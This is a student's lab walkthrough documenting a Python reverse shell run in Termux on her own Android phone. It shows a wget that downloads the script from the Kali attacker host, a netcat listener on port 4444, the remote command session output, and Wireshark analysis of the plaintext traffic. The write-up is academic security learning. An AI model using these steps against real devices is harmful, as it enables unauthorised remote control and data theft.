# Android Payload Creation — Lab Walkthrough

**Student Name:** Mahrukh  
**Environment:** Controlled & Isolated Lab Setup  
**Network:** Bridged Adapter (local network)

---

## Overview

This document walks through the complete process of creating and deploying a Python reverse shell payload on a **physical Android device** running Android 15. The Android environment was set up using **Termux**, which provides a Linux-like shell for running Python scripts.

---

## Step 1 — Network Setup (Bridged Adapter)

Unlike the Ubuntu lab (which used Host-Only networking), the Android lab required a **Bridged Adapter** configuration on Kali Linux. This placed the Kali VM and the physical Android phone on the **same local network**, enabling direct communication.

**Why Bridged for Android?**
- Android devices cannot easily join VirtualBox Host-Only networks
- Bridged mode mirrors the VM onto the host's physical network
- Both Kali and the Android device obtain IPs from the same DHCP server

---

## Step 2 — Android Device Configuration

A physical **Samsung smartphone** was used as the victim device.

| Property | Value |
|---|---|
| **Manufacturer** | Samsung |
| **Model** | SM-A145F |
| **Android Version** | 15 |
| **UI Version** | One UI 7.0 |

---

## Step 3 — Termux Installation on Android

**Termux** was installed on the Android device via **F-Droid** (an open-source app store). Termux provides a full Linux-compatible terminal environment on Android, including Python 3 support.

> **Why F-Droid instead of Google Play?**  
> The Google Play version of Termux is outdated. F-Droid hosts the actively maintained version with full package support.

**Setup inside Termux:**
```bash
pkg update && pkg upgrade
pkg install python
```

---

## Step 4 — IP Address Verification

IP addresses were verified on Kali Linux and confirmed by pinging from Termux.

| Machine | IP Address |
|---|---|
| Kali Linux (Attacker) | `192.168.0.106` |
| Android Device (Victim) | `192.168.0.101` |

**Ping test from Termux (Android → Kali):**
```bash
ping 192.168.0.106
```

**Result:** Successful ICMP replies confirmed network reachability.

---

## Step 5 — Python Reverse Shell Script (Android)

The Android reverse shell script was adapted from the Ubuntu version with additional features suited to the mobile environment.

**Key differences from Ubuntu script:**

| Feature | Ubuntu Script | Android Script |
|---|---|---|
| Device info | ❌ | ✅ (model + Android version via `getprop`) |
| Heartbeat | ❌ | ✅ (`[HB] Android Termux alive` every 10s) |
| Log file path | `command_log.txt` (relative) | `/data/data/com.termux/files/home/` (absolute) |
| Error handling | Basic | Full `try/except/finally` |
| Exit commands | `exit` | `exit` or `quit` |

📄 Full script: [`../scripts/android_reverse_shell.py`](../scripts/android_reverse_shell.py)

**File transferred to Termux via Python HTTP server:**
```bash
# On Kali:
python3 -m http.server 8080

# On Android (Termux):
wget http://192.168.0.106:8080/mahrukh_reverseshell.py
```

---

## Step 6 — Listener Setup on Kali (Netcat)

A Netcat listener was started on Kali, waiting for the incoming Android connection.

```bash
nc -lvnp 4444
```

```
listening on [any] 4444 ...
```

---

## Step 7 — Android (Not shown: Step 7 in PDF)

*See Step 5 above — script was transferred directly to Termux.*

---

## Step 8 — Python Code Execution on Android

With the Netcat listener active, the script was executed inside Termux on the Android device.

```bash
python3 mahrukh_reverseshell.py
```

---

## Step 9 — Reverse Shell Session Establishment

Upon execution, the Android device initiated a TCP connection to Kali on port 4444.

**On Kali — connection received:**
```
listening on [any] 4444 ...
connect to [192.168.0.106] from (UNKNOWN) [192.168.0.101] 33324
[+] Android (Termux) connected
Model: SM-A145F
Android Version: 15
[HB] Android Termux alive
```

**Commands executed from Kali:**
```bash
whoami
# Output: u0_a824

ls
# Output: connection_log.txt  mahrukh_payload.py  mahrukh_reverseshell.py  revshell_log.txt

pwd
# Output: /data/data/com.termux/files/home
```

✅ **Reverse shell session successfully established from Android to Kali.**

---

## Step 10 — Wireshark Traffic Analysis

Wireshark was running on Kali Linux throughout the Android session.

**Display filter:**
```
tcp.port == 4444
```

**Observations:**
- TCP handshake visible between `192.168.0.106` (Kali) and `192.168.0.101` (Android)
- Heartbeat messages visible as periodic PSH/ACK packets from Android to Kali
- Device info (`Model: SM-A145F`, `Android Version: 15`) transmitted in plaintext
- Command and output traffic unencrypted — readable directly in Wireshark packet payloads

**Notable:** The Android Termux user ran as `u0_a824` — an Android application UID, confirming the shell is running inside the Termux app sandbox.

---

## Summary

| Step | Action | Result |
|---|---|---|
| 1 | Bridged network configured on Kali | ✅ Same LAN as Android |
| 2 | Android device identified | ✅ Samsung SM-A145F, Android 15 |
| 3 | Termux installed via F-Droid | ✅ Python environment ready |
| 4 | IP addresses verified, ping tested | ✅ Network reachable |
| 5 | Script written and transferred | ✅ File in Termux home dir |
| 6 | Netcat listener started on Kali | ✅ Listening on 4444 |
| 7 | Script executed in Termux | ✅ `python3 mahrukh_reverseshell.py` |
| 8 | Session established | ✅ Connection received on Kali |
| 9 | Commands executed remotely | ✅ Output received, heartbeats active |
| 10 | Wireshark traffic captured | ✅ TCP 4444 traffic fully captured |

---

## Termux-Specific Notes

- Termux sandboxes each app — the process runs as a unique Android UID (`u0_a824`)
- File system access is limited to `/data/data/com.termux/files/home/`
- System commands like `getprop` are accessible and return real device information
- Python standard libraries (`socket`, `subprocess`, `os`, `time`) all function normally in Termux

---

*Lab conducted on personally owned devices in a controlled environment for academic purposes only.*
